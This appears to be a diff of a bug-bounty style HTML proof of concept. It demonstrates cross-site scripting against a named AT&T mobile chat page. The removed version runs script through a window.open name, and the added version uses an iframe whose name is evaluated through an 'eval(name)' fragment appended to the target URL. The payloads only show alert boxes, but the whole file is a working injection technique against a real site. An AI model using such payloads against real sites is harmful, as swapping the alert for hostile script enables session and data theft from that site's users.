@@ -1,11 +1,6 @@
 <html>
     <body>
         <h2>PoC</h2>
-        <label onclick="exploit()">Click me</label>
-        <script>
-            function exploit() {
-                var win = window.open("https://m.att.com/scripts/touchcommerce/inqChat.html?IFRAME", "javascript:alert(document.domain)", "");
-            }
-        </script>
+        <iframe name="alert(1)" src="https://m.att.com/scripts/touchcommerce/inqChat.html?IFRAME;eval(name)//"></iframe>
     </body>
 </html>
